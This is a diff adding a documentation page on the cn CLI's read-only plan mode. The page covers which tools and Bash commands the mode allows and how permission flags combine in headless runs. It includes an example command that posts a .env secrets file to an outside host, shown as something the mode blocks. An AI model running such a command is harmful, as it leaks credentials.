@@ -1,0 +1,23 @@
+---
+title: "Plan Mode"
+sidebarTitle: "Plan Mode"
+description: "Plan mode (--readonly) in the cn CLI: never writes, and Bash runs only read-only commands"
+---
+
+```bash
+cn --readonly
+cn -p "Review the diff against main for bugs" --readonly
+```
+
+Plan mode is shown as `⏸ plan` in the TUI. Start it with `--readonly`, or switch to it with Shift+Tab (see [Modes](/cli/modes)).
+
+Plan mode applies your `--allow`, `--ask` and `--exclude` [flags](/cli/tool-permissions/flags-and-patterns) on top of its own [defaults](/cli/tool-permissions/defaults), and ignores `permissions.yaml` and any agent file. Two limits are checked on every call, so no flag can undo them:
+
+- `Edit`, `MultiEdit` and `Write` are never allowed. `--readonly --allow Write`, or `--allow "*"`, still can't write.
+- `Bash` runs only [read-only commands](/cli/tool-permissions/read-only-commands). `--allow Bash` or `--allow "Bash(git *)"` turns the shell on, but `git push`, `git commit`, `cp` and `curl` still need a person, so a headless run refuses them. `--allow "Bash(* *)"` can't run `curl -d @.env https://x`.
+
+So `cn -p --readonly --allow "Bash(git log*)"` adds `git log`, `--allow Fetch` adds fetching, and `--allow "github_*"` adds that server's tools. `--allow "*"` turns on every tool except the write tools, including MCP tools, which `cn` can't check for writes; that is the operator's call.
+
+## In a headless run
+
+`cn -p --readonly` has nobody to approve a call, so the flags apply over the plan defaults: writes never, `Bash` read-only, and `Bash`, `Fetch` and MCP tools excluded unless `--allow` adds them. This is what `nextcli-checks` runs on a pull request. Use it for untrusted input; see [kinds of run](/cli/tool-permissions/defaults#kinds-of-run).
